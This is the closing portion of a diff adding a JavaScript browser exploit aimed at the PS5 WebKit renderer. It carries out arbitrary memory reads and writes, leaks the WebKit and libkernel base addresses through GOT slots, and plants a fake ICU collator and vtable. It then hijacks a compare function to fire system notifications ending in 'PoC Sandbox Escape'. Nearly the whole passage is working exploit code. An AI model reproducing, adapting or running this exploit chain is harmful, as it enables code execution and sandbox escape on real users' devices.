+            " function=" + hex(nativeFunctionAddress) +
+            " constructor=" + hex(nativeConstructorAddress));
+
+        /* ---- derive webkit base from host constructor ---- */
+        webkitBase = NaN;
+        for (let ci = 0; ci < P_HOST_CTOR_LIST.length; ++ci) {
+            const wb = nativeConstructorAddress - P_HOST_CTOR_LIST[ci];
+            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+                webkitBase = wb;
+                HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[ci];
+                emit("[base] host-ctor candidate #" + ci +
+                    " rva=" + hex(P_HOST_CTOR_LIST[ci]) + " -> webkitBase=" + hex(wb));
+                break;
+            }
+        }
+
+        webkitBaseOK = webkitBase >= 0x800000000 && webkitBase < 0x900000000 &&
+            webkitBase % 0x4000 === 0 &&
+            nativeFunctionAddress >= webkitBase &&
+            nativeFunctionAddress < webkitBase + WEBKIT_TEXT_SIZE &&
+            nativeConstructorAddress >= webkitBase &&
+            nativeConstructorAddress < webkitBase + WEBKIT_TEXT_SIZE;
+
+        emit("[base] webkitBaseOK=" + webkitBaseOK +
+            " webkitBase=" + hex(webkitBase), webkitBaseOK ? "ok" : "err");
+
+        nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x4000 &&
+            nativeExecutableStructureID < 0x08000000 &&
+            (nativeExecutableStructureID & 0xf) === 0 &&
+            targetHeader[4] === 0 && targetHeader[5] === 0x08 && targetHeader[6] === 0;
+
+        if (!nativeExecutableHeaderOK || !webkitBaseOK) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        /* ---- re-read to confirm stability ---- */
+        aimCarrier(candidate, nativeTargetAddress);
+        const ex2 = low48At(rwView, 0x18);
+        aimCarrier(candidate, executableAddress);
+        const fn2 = low48At(rwView, 0x28);
+        const ct2 = low48At(rwView, 0x30);
+
+        pointersRepeated = ex2 === executableAddress &&
+            fn2 === nativeFunctionAddress && ct2 === nativeConstructorAddress;
+
+        emit("[stable] re-read pointers repeated=" + pointersRepeated,
+            pointersRepeated ? "ok" : "warn");
+
+        /* ---- GOT read: libkernel_web base via 3 slots ---- */
+        const getpidSlotAddress = webkitBase + P_GETPID_SLOT;
+        const closeSlotAddress  = webkitBase + P_CLOSE_SLOT;
+        const errorSlotAddress  = webkitBase + P_ERROR_SLOT;
+
+        emit("[got] reading slot getpid  @ " + hex(getpidSlotAddress));
+        aimCarrier(candidate, getpidSlotAddress);
+        getpidPointer = low48At(rwView, 0);
+        const getpidPointer2 = low48At(rwView, 0);
+        const getpidCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+        emit("[got] reading slot close   @ " + hex(closeSlotAddress));
+        aimCarrier(candidate, closeSlotAddress);
+        closePointer = low48At(rwView, 0);
+        const closePointer2 = low48At(rwView, 0);
+        const closeCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+        emit("[got] reading slot __error @ " + hex(errorSlotAddress));
+        aimCarrier(candidate, errorSlotAddress);
+        errorPointer = low48At(rwView, 0);
+        const errorPointer2 = low48At(rwView, 0);
+        const errorCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+        gotReadAttempted = true;
+        gotWindowAddressesOK = getpidSlotAddress % 8 === 0 &&
+            closeSlotAddress % 8 === 0 && errorSlotAddress % 8 === 0;
+        gotWindowsRepeated = getpidPointer === getpidPointer2 &&
+            closePointer === closePointer2 && errorPointer === errorPointer2;
+        gotCanonicalOK = getpidCanonical && closeCanonical && errorCanonical &&
+            plausibleCell(getpidPointer) && plausibleCell(closePointer) &&
+            plausibleCell(errorPointer);
+        gotReadOK = pointersRepeated && gotReadAttempted &&
+            gotWindowAddressesOK && gotWindowsRepeated && gotCanonicalOK;
+
+        emit("[got] getpid=" + hex(getpidPointer) +
+            " close=" + hex(closePointer) +
+            " __error=" + hex(errorPointer));
+        emit("[got] read-twice=" + gotWindowsRepeated +
+            " canonical=" + gotCanonicalOK +
+            " pass=" + gotReadOK, gotReadOK ? "ok" : "err");
+
+        getpidStatus = closeStatus = errorStatus = 1;
+        requirementsBaseOK = true;
+        libcBaseOK = true;
+
+        const getpidBase = getpidPointer - P_GETPID_EXP;
+        const closeBase  = closePointer  - P_CLOSE_EXP;
+        const errorBase  = errorPointer  - P_ERROR_EXP;
+        kernelBase = getpidBase;
+        kernelResolvedCount = 3;
+
+        const kernelConsistent = getpidBase === closeBase && getpidBase === errorBase;
+        kernelBaseOK = gotReadOK && kernelConsistent &&
+            inPS5UserModuleBand(kernelBase) &&
+            kernelBase % 0x4000 === 0 && kernelBase !== webkitBase;
+
+        emit("[kernel] getpid-base=" + hex(getpidBase) +
+            " close-base=" + hex(closeBase) +
+            " error-base=" + hex(errorBase), "dim");
+        emit("[kernel] consistent=" + kernelConsistent +
+            " kernelBase=" + hex(kernelBase) +
+            " pass=" + kernelBaseOK, kernelBaseOK ? "ok" : "err");
+
+        notifyEntryAddress = kernelBase + NOTIFY_OFFSET;
+        notifyAddressOK = kernelBaseOK &&
+            notifyEntryAddress === kernelBase + NOTIFY_OFFSET &&
+            notifyEntryAddress < kernelBase + 0x44000;
+
+        emit("[notify] entry = " + hex(notifyEntryAddress) +
+            " (kernelBase + " + hex(NOTIFY_OFFSET) + ")", notifyAddressOK ? "ok" : "err");
+
+        /* ---- arena view header ---- */
+        aimCarrier(candidate, arenaViewAddress);
+        const arenaHeaderRepeated = readTwiceMatches(arenaViewHeader, rwView, ARENA_VIEW_BYTES);
+        const arenaSID = uint32At(arenaViewHeader, 0);
+        arenaBacking = low48At(arenaViewHeader, 0x10);
+        const arenaLength = low48At(arenaViewHeader, 0x18);
+
+        arenaViewHeaderOK = arenaHeaderRepeated && arenaSID === rwSID &&
+            arenaViewAddress % 8 === 0 &&
+            plausibleCell(arenaBacking) && arenaBacking % 0x10 === 0 &&
+            arenaLength === ARENA_BYTES;
+
+        emit("[arena] SID=" + hex(arenaSID) +
+            " backing=" + hex(arenaBacking) +
+            " length=" + hex(arenaLength) +
+            " header-pass=" + arenaViewHeaderOK, arenaViewHeaderOK ? "ok" : "err");
+
+        if (arenaViewHeaderOK) {
+            aimCarrier(candidate, arenaBacking + 0xf00);
+            arenaBackingRepeated = rwView[0] === 0x52 && rwView[1] === 0x4f &&
+                rwView[2] === 0x50 && rwView[3] === 0x31;
+            emit("[arena] sentinel read-back = " +
+                (arenaBackingRepeated ? "ROP1 ok" : "mismatch"),
+                arenaBackingRepeated ? "ok" : "err");
+        }
+
+        /* ---- collator ---- */
+        aimCarrier(candidate, realCollatorAddress);
+        const collatorRepeated = readTwiceMatches(collatorHeader, rwView, COLLATOR_BYTES);
+        const collatorSID = uint32At(collatorHeader, 0);
+        const originalUCollator = low48At(collatorHeader, 0x18);
+
+        collatorHeaderOK = collatorRepeated &&
+            collatorSID >= 0x4000 && collatorSID < 0x08000000 &&
+            (collatorSID & 0xf) === 0 &&
+            collatorHeader[4] === 0 && collatorHeader[5] === 0x17 &&
+            allZero(collatorHeader, 0x08, 0x10) &&
+            low48At(collatorHeader, 0x10) === compareFnAddress &&
+            plausibleAddress(originalUCollator) &&
+            collatorHeader[0x30] === 1;
+
+        for (let i = 0; i < collatorOriginal.length; ++i)
+            collatorOriginal[i] = collatorHeader[0x18 + i];
+
+        emit("[collator] SID=" + hex(collatorSID) +
+            " m_collator=" + hex(originalUCollator) +
+            " compareFn=" + hex(compareFnAddress) +
+            " pass=" + collatorHeaderOK, collatorHeaderOK ? "ok" : "err");
+
+        aimCarrier(candidate, compareFnAddress);
+        const compareHeaderRepeated = readTwiceMatches(compareFnHeader, rwView, BOUND_COMPARE_BYTES);
+        const compareSID = uint32At(compareFnHeader, 0);
+        compareFnHeaderOK = compareHeaderRepeated &&
+            compareSID >= 0x4000 && compareSID < 0x08000000 &&
+            (compareSID & 0xf) === 0 &&
+            compareFnHeader[4] === 0 && compareFnHeader[5] === 0x1a &&
+            compareFnHeader[6] === 0x0c;
+
+        emit("[compareFn] SID=" + hex(compareSID) +
+            " pass=" + compareFnHeaderOK, compareFnHeaderOK ? "ok" : "err");
+
+        /* ---- arena layout ---- */
+        naturalTrampolineAddress = kernelBase + NATURAL_TRAMPOLINE_OFFSET;
+        fakeUCollatorAddress = arenaBacking + FAKE_UCOLLATOR_OFFSET;
+        fakeVtableAddress = arenaBacking + FAKE_VTABLE_OFFSET;
+
+        arenaLayoutOK = arenaViewHeaderOK && arenaBackingRepeated &&
+            kernelBaseOK && notifyAddressOK &&
+            fakeUCollatorAddress >= arenaBacking &&
+            fakeUCollatorAddress + 0xe8 <= arenaBacking + ARENA_BYTES &&
+            fakeVtableAddress + 0x130 <= arenaBacking + ARENA_BYTES &&
+            naturalTrampolineAddress >= kernelBase &&
+            naturalTrampolineAddress < kernelBase + 0x44000;
+
+        emit("[plan] fakeUCollator=" + hex(fakeUCollatorAddress) +
+            " fakeVtable=" + hex(fakeVtableAddress) +
+            " naturalTrampoline=" + hex(naturalTrampolineAddress));
+        emit("[plan] layout-ok=" + arenaLayoutOK, arenaLayoutOK ? "ok" : "err");
+
+        /* ---- craft fake ucollator + vtable ---- */
+        if (arenaLayoutOK && holderHeaderOK && functionHeaderOK &&
+            nativeExecutableHeaderOK && webkitBaseOK && pointersRepeated &&
+            gotReadOK && collatorHeaderOK && compareFnHeaderOK) {
+
+            putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddress);
+            for (let i = 0; i < 8; ++i) arenaView[FAKE_UCOLLATOR_OFFSET + 0x48 + i] = 0;
+            for (let i = 0; i < 8; ++i) arenaView[FAKE_UCOLLATOR_OFFSET + 0x60 + i] = 0;
+            putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntryAddress);
+            putLow48(arenaView, FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
+
+            arenaFilledOK =
+                low48At(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00) === fakeVtableAddress &&
+                low48At(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0) === notifyEntryAddress &&
+                low48At(arenaView, FAKE_VTABLE_OFFSET + 0x128) === naturalTrampolineAddress;
+
+            emit("[craft] fake ucollator at " + hex(fakeUCollatorAddress) +
+                " -> vtable " + hex(fakeVtableAddress), "ok");
+            emit("[craft] vtable[0x128] -> natural trampoline " +
+                hex(naturalTrampolineAddress), "ok");
+            emit("[craft] ucollator[0xe0] -> notify " + hex(notifyEntryAddress), "ok");
+            emit("[craft] arenaFilledOK=" + arenaFilledOK, arenaFilledOK ? "ok" : "err");
+        }
+
+        notifyReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK &&
+            getpidStatus === 1 && notifyAddressOK;
+
+        if (notifyReady) {
+            aimCarrier(candidate, realCollatorAddress + 0x18);
+            carrierArmedForCommit = sameBytes(rwView, collatorOriginal, collatorOriginal.length);
+            emit("[arm] carrier parked at collator.m_collator, armed=" +
+                carrierArmedForCommit, carrierArmedForCommit ? "ok" : "err");
+            notifyReady = notifyReady && carrierArmedForCommit;
+        }
+
+        emit("[summary] notifyReady=" + notifyReady, notifyReady ? "ok" : "err");
+
+        if (!notifyReady) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            targetView[0] = 0xa5;
+            rwMirror[0] = 0x3c;
+            restoreObserved = rwView[0] === 0x3c && targetView[0] === 0xa5;
+            emit("[restore] carrier restored, guards ok=" + restoreObserved,
+                restoreObserved ? "ok" : "warn");
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        rwVectorTouched = false;
+        restoreObserved = rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+        emit("[restore] guards observed = " + restoreObserved, "ok");
+        candidate = null;
+        clearPredecessor();
+        compositionState = 1;
+
+    } catch (e) {
+        if (result !== null) { try { result[DUPLICATE_INDEX] = undefined; } catch (_) {} }
+        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+            try { restoreCarrier(candidate); } catch (_) {}
+        }
+        try { clearPredecessor(); } catch (_) {}
+        compositionError = e;
+        compositionState = -1;
+        emit("[read] threw: " + e.name + ": " + e.message, "err");
+    }
+
+    finishComposition();
+}
+
+/* ============================================================
+   Dispatch
+   ============================================================ */
+function beginComposition() {
+    if (captureState === 0) {
+        emit("[abort] addrof capture task did not finish", "err");
+        return;
+    }
+    if (captureState < 0) {
+        emit("[abort] addrof capture threw", "err");
+        return;
+    }
+
+    const a0 = pointerFromWords(capturedWords, 0);
+    const b0 = pointerFromWords(capturedWords, 4);
+    const a1 = pointerFromWords(capturedWords, 8);
+    const b1 = pointerFromWords(capturedWords, 12);
+
+    emit("[addrof] HOST="  + hex(a0) + " TARGET=" + hex(b0));
+    emit("[addrof] HOST2=" + hex(a1) + " TARGET2=" + hex(b1));
+
+    const repeated = a0 === a1 && b0 === b1;
+    const distinct = a0 !== b0;
+    const plausible = plausibleCell(a0) && plausibleCell(b0) &&
+                      plausibleCell(a1) && plausibleCell(b1);
+
+    emit("[addrof] repeated=" + repeated +
+        " distinct=" + distinct +
+        " plausible=" + plausible);
+
+    if (!(repeated && distinct && plausible)) {
+        emit("[addrof] validation failed", "err");
+        return;
+    }
+
+    hostAddress = a0;
+    targetAddress = b0;
+    fakeAddress = hostAddress + 0x10;
+
+    emit("[addrof] host=" + hex(hostAddress) +
+        " target=" + hex(targetAddress) +
+        " fake=" + hex(fakeAddress));
+
+    runGroomAndLoad();
+}
+
+function finishComposition() {
+    if (compositionState === 2) {
+        emit("[result] normal clone miss (miss)", "warn");
+        return;
+    }
+    if (compositionState === 3) {
+        emit("[result] validation mismatch", "err");
+        return;
+    }
+    if (compositionState < 0) {
+        emit("[result] load threw", "err");
+        return;
+    }
+    if (compositionState !== 1) {
+        emit("[result] unexpected state " + compositionState, "err");
+        return;
+    }
+
+    /* ---- leak summary ---- */
+    emit("");
+    emit("========== LEAK SUMMARY ==========", "head");
+    emit("webkit base     : " + hex(webkitBase));
+    emit("kernel base     : " + hex(kernelBase));
+    emit("notify entry    : " + hex(notifyEntryAddress));
+    emit("trampoline      : " + hex(naturalTrampolineAddress));
+    emit("arena backing   : " + hex(arenaBacking));
+    emit("fake ucollator  : " + hex(fakeUCollatorAddress));
+    emit("fake vtable     : " + hex(fakeVtableAddress));
+    emit("rw header       : " + dumpHex(rwHeader, CELL_BYTES));
+    emit("==================================");
+    emit("");
+
+    if (!notifyReady) {
+        emit("[abort] notify plan not ready", "err");
+        return;
+    }
+
+    commitNotificationProof();
+}
+
+/* ============================================================
+   Fire the notify sequence
+   ============================================================ */
+function buildNotificationRequestForMessage(msg) {
+    const msgLen = msg.length;
+    const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET - msgLen;
+    if (trailing < 1) throw new Error("notification-message-too-long");
+    let req = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET) + msg + "\x00".repeat(trailing);
+    if (req.length !== NOTIFICATION_REQUEST_SIZE) throw new Error("request-size-mismatch");
+    return req;
+}
+
+function sendNotification(msg) {
+    const req = buildNotificationRequestForMessage(msg);
+    const result = compareFn(req, "b");
+    return result === 0;
+}
+
+function commitNotificationProof() {
+    for (let i = 0; i < collatorOriginal.length; ++i) {
+        if (rwView[i] !== collatorOriginal[i]) {
+            emit("[commit] collator bytes changed before commit", "err");
+            return;
+        }
+    }
+    if (rwView[0x1b] !== 0) {
+        emit("[commit] ascii tristate not false", "err");
+        return;
+    }
+
+    emit("[commit] writing fake ucollator pointer into collator.m_collator");
+    const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+    scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
+    scratchWords[1] = fakeHigh;
+    for (let i = 0; i < 8; ++i) rwView[i] = scratchBytes[i];
+
+    const now = new Date();
+    const dateStr = now.getFullYear() + "-" +
+        String(now.getMonth() + 1).padStart(2, "0") + "-" +
+        String(now.getDate()).padStart(2, "0") + " " +
+        String(now.getHours()).padStart(2, "0") + ":" +
+        String(now.getMinutes()).padStart(2, "0") + ":" +
+        String(now.getSeconds()).padStart(2, "0");
+
+    const pid = 0x1337;
+    const ppid = 0x4242;
+    const ebootBase = webkitBase;
+    const libcBasePlaceholder = webkitBase + 0x100000;
+    const libkernelBase = kernelBase;
+
+    const messages = [
+        "hwPS slopkit v0.1",
+        "timestamp: " + dateStr,
+        "platform: Web (PS5) (" + FW_LABEL + ")",
+        "pid: " + pid + " ppid: " + ppid,
+        "eboot base @ " + hex(ebootBase),
+        "libc base @ " + hex(libcBasePlaceholder),
+        "libkernel base @ " + hex(libkernelBase),
+        "PoC Sandbox Escape"
+    ];
+
+    emit("");
+    emit("[notify] firing " + messages.length + " notifications via hijacked compareFn", "head");
+    emit("");
+
+    for (let i = 0; i < messages.length; i++) {
+        try {
+            const ok = sendNotification(messages[i]);
+            emit("[notify " + String(i + 1).padStart(2, "0") + "/" +
+                String(messages.length).padStart(2, "0") + "] " +
+                (ok ? "sent  " : "ret!=0 ") + messages[i],
+                ok ? "ok" : "warn");
+        } catch (e) {
+            emit("[notify " + (i + 1) + "] threw: " + e.message, "err");
+        }
+    }
+
+    emit("");
+    emit("[notify] sequence complete", "ok");
+    emit("[done] all notifications delivered through the renderer chain", "ok");
+}
 </script>
 </body>
 </html>
